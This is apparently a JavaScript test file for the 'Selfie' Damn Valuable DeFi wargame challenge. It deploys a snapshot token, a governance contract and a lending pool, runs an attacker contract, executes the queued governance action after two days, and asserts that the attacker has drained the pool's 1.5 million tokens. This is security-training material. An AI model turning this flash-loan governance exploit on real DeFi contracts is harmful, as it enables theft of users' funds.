const {
  balance,
  time,
  constants,
  ether,
  BN,
} = require("@openzeppelin/test-helpers");

const { accounts, contract, web3 } = require("@openzeppelin/test-environment");

const SelfiePool = contract.fromArtifact("SelfiePool");
const SimpleGovernance = contract.fromArtifact("SimpleGovernance");

const DamnValuableTokenSnapshot = contract.fromArtifact(
  "DamnValuableTokenSnapshot"
);
const SelfieAttacker = contract.fromArtifact("SelfieAttacker");

const { expect } = require("chai");

describe("Selfie challenge", function () {
  const [deployer, attacker, ...otherAccount] = accounts;

  const POOL_INITIAL_TOKEN_BALANCE = ether("1500000");
  const INITIAL_TOKEN_SUPPLY = ether("2000000");

  before(async function () {
    this.token = await DamnValuableTokenSnapshot.new(INITIAL_TOKEN_SUPPLY, {
      from: deployer,
    });

    this.governance = await SimpleGovernance.new(this.token.address, {
      from: deployer,
    });

    this.pool = await SelfiePool.new(
      this.token.address,
      this.governance.address,
      { from: deployer }
    );

    this.selfieAttacker = await SelfieAttacker.new({ from: attacker });

    await this.token.transfer(this.pool.address, POOL_INITIAL_TOKEN_BALANCE, {
      from: deployer,
    });

    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.eq(
      POOL_INITIAL_TOKEN_BALANCE
    );
  });
  it("Exploit Selfie", async function () {
    await this.selfieAttacker.attack(
      this.pool.address,
      this.token.address,
      this.governance.address,
      { from: attacker }
    );

    await time.increase(time.duration.days(2));

    await this.governance.executeAction(await this.selfieAttacker.actionId(), {
      from: attacker,
    });
  });

  after(async function () {
    expect(await this.token.balanceOf(attacker)).to.be.bignumber.eq(
      POOL_INITIAL_TOKEN_BALANCE
    );

    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.eq(
      "0"
    );
  });
});
